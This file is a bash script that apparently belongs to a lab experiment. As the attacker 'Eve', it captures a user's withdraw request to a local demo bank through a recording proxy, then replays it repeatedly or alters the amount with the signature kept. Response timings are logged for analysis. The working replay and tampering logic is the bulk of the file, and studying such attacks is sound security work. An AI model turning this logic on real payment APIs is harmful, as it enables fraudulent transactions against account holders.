#!/usr/bin/env bash
set -euo pipefail

HOST="localhost:3000"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_FILE="$SCRIPT_DIR/payload.json"
CAPTURE_FILE="${CAPTURE_FILE:-/tmp/eve-captured.json}"
TAMPERED_FILE="/tmp/eve-tampered.json"
TIMING_CSV="${TIMING_CSV:-/tmp/eve-attack-timings.csv}"
RUN_ID="${ATTACK_RUN_ID:-$(date -u +%Y%m%dT%H%M%SZ)-$$}"

usage() {
  cat <<EOF
Usage:
  bash attack/attack.sh
  bash attack/attack.sh --capture   (wait for experiments/recording-proxy.js capture)
  bash attack/attack.sh --replay [count]
  bash attack/attack.sh --tamper-amount AMOUNT
EOF
}

require_jq() {
  if ! command -v jq >/dev/null 2>&1; then
    echo "[EVE] Abort: jq is required in Eve's shell."
    exit 1
  fi
}

json_state() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "__missing__"
    return
  fi

  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" | awk '{print $1}'
    return
  fi

  cksum "$file"
}

validate_json_file() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "[EVE] Abort: payload file does not exist: $file"
    return 1
  fi

  if ! jq -e . "$file" >/dev/null 2>&1; then
    echo "[EVE] Abort: payload file is not valid JSON: $file"
    return 1
  fi
}

print_refresh_hint() {
  echo "[EVE] Start the localhost recording proxy and point the bank UI at it, then make a successful local withdraw."
  echo "[EVE] Set CAPTURE_FILE to the proxy's capture file as visible from WSL."
}

extract_body() {
  local file="$1"
  jq -c 'if has("request") then (.request.body | if type == "string" then fromjson else . end) else . end' "$file"
}

payload_age() {
  local file="$1"
  local payload_timestamp payload_epoch now_epoch

  payload_timestamp="$(extract_body "$file" | jq -r '.timestamp // empty')"
  if [[ -z "$payload_timestamp" ]]; then
    echo "[EVE] Abort: payload timestamp is missing."
    print_refresh_hint
    return 1
  fi

  payload_epoch="$(date -u -d "$payload_timestamp" +%s 2>/dev/null || true)"
  if [[ -z "$payload_epoch" ]]; then
    payload_epoch="$(node -e "const ms = Date.parse(process.argv[1]); if (Number.isNaN(ms)) process.exit(1); console.log(Math.floor(ms / 1000));" "$payload_timestamp" 2>/dev/null || true)"
  fi

  if [[ -z "$payload_epoch" ]]; then
    echo "[EVE] Abort: payload timestamp could not be parsed."
    print_refresh_hint
    return 1
  fi

  now_epoch="$(date -u +%s)"
  echo $((now_epoch - payload_epoch))
}

wallclock_ns() {
  # WSL is the attacker shell only and does not require Node.js.
  date +%s%N
}

send_timed_request() {
  local scenario="$1" body_file="$2" auth="$3" index="$4"
  local started ended response status body outcome duration
  started="$(wallclock_ns)"
  if [[ -n "$auth" ]]; then
    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
      -H "Content-Type: application/json" -H "Authorization: $auth" -d "@$body_file")"
  else
    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
      -H "Content-Type: application/json" -d "@$body_file")"
  fi
  ended="$(wallclock_ns)"
  status="${response##*__HTTP_STATUS__:}"
  body="${response%$'\n'__HTTP_STATUS__:*}"
  duration="$((ended - started))"
  outcome="$(printf '%s' "$body" | jq -r '.reason // .status // .error // "UNKNOWN"' 2>/dev/null || echo UNKNOWN)"
  if [[ ! -f "$TIMING_CSV" ]]; then
    printf 'run_id,scenario_id,request_index,started_ns,ended_ns,duration_ns,http_status,outcome\n' >> "$TIMING_CSV"
  fi
  printf '%s,%s,%s,%s,%s,%s,%s,%s\n' "$RUN_ID" "$scenario" "$index" "$started" "$ended" "$duration" "$status" "$outcome" >> "$TIMING_CSV"
  printf '%s\n' "$body" | jq .
}

send_payload() {
  local file="$1"
  local count="$2"
  local age auth body_file

  require_jq
  validate_json_file "$file"
  age="$(payload_age "$file")"
  auth="$(jq -r '.request.headers.authorization // empty' "$file" 2>/dev/null || true)"
  body_file="$(mktemp)"
  extract_body "$file" > "$body_file"

  echo "[EVE] Starting Replay Attack on $HOST..."
  echo "[EVE] Payload: $file"
  echo "[EVE] Payload age: ${age}s"

  for ((i = 1; i <= count; i++)); do
    echo "[EVE] Replay attempt #$i..."
    if [[ -n "$auth" ]]; then
      send_timed_request "replay" "$body_file" "$auth" "$i"
    else
      send_timed_request "replay" "$body_file" "" "$i"
    fi
    sleep 1
  done
  rm -f "$body_file"
}

captured_source() {
  if [[ -f "$CAPTURE_FILE" ]]; then
    echo "$CAPTURE_FILE"
    return
  fi

  echo "$PAYLOAD_FILE"
}

capture_mode() {
  require_jq

  echo "[EVE] Waiting for Anis's next withdraw..."
  echo "[EVE] Monitoring captured request..."

  local previous_state current_state
  previous_state="$(json_state "$CAPTURE_FILE")"

  trap 'echo; echo "[EVE] Capture watcher interrupted."; exit 130' INT

  while true; do
    sleep 1
    current_state="$(json_state "$CAPTURE_FILE")"

    if [[ "$current_state" == "$previous_state" ]]; then
      continue
    fi

    previous_state="$current_state"

    if ! validate_json_file "$CAPTURE_FILE"; then
      echo "[EVE] Waiting for the next valid proxy recording..."
      continue
    fi
    local body_file
    body_file="$(mktemp)"
    if ! extract_body "$CAPTURE_FILE" > "$body_file" || ! jq -e . "$body_file" >/dev/null 2>&1; then
      rm -f "$body_file"
      continue
    fi

    echo "[EVE] NEW WITHDRAW PACKET CAPTURED"
    jq -r '
      "[EVE] method: " + (.method | tostring),
      "[EVE] path: " + (.path | tostring),
      "[EVE] user_id: " + (.user_id | tostring),
      "[EVE] amount: " + (.amount | tostring),
      "[EVE] timestamp: " + (.timestamp | tostring),
      "[EVE] nonce: " + (.nonce | tostring),
      "[EVE] request_id: " + (.request_id | tostring)
    ' "$body_file"
    rm -f "$body_file"
    echo "[EVE] Exact captured request saved to $CAPTURE_FILE"
    return
  done
}

replay_mode() {
  local count="${1:-1}"
  local source

  if ! [[ "$count" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: replay count must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  if [[ "$source" == "$CAPTURE_FILE" ]]; then
    echo "[EVE] Using attacker-side captured request: $source"
  else
    echo "[EVE] No attacker-side capture found at $CAPTURE_FILE."
    echo "[EVE] Falling back to synchronized payload: $source"
  fi

  send_payload "$source" "$count"
}

tamper_amount_mode() {
  local new_amount="$1"
  local source original_amount auth body_file

  require_jq

  if ! [[ "$new_amount" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: tampered amount must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  validate_json_file "$source"

  original_amount="$(extract_body "$source" | jq -r '.amount // empty')"
  auth="$(jq -r '.request.headers.authorization // empty' "$source" 2>/dev/null || true)"
  jq --argjson amount "$new_amount" 'if has("request") then .request.body = ((if (.request.body|type)=="string" then (.request.body|fromjson) else .request.body end) | .amount=$amount | tojson) else .amount=$amount end' "$source" > "$TAMPERED_FILE"

  echo "[EVE] TAMPERING WITH CAPTURED PACKET"
  echo "[EVE] Source payload: $source"
  echo "[EVE] Original amount: $original_amount"
  echo "[EVE] Modified amount: $new_amount"
  echo "[EVE] Signature: UNCHANGED"
  echo "[EVE] Signature: preserved without printing its value"
  echo "[EVE] Sending modified packet..."

  body_file="$(mktemp)"
  extract_body "$TAMPERED_FILE" > "$body_file"
  if [[ -n "$auth" ]]; then
    send_timed_request "tamper" "$body_file" "$auth" 1
  else
    send_timed_request "tamper" "$body_file" "" 1
  fi
  rm -f "$body_file"
}

case "${1:-}" in
  "")
    send_payload "$PAYLOAD_FILE" 10
    ;;
  "--capture")
    capture_mode
    ;;
  "--replay")
    replay_mode "${2:-1}"
    ;;
  "--tamper-amount")
    if [[ $# -ne 2 ]]; then
      usage
      exit 1
    fi
    tamper_amount_mode "$2"
    ;;
  "--help"|"-h")
    usage
    ;;
  *)
    usage
    exit 1
    ;;
esac
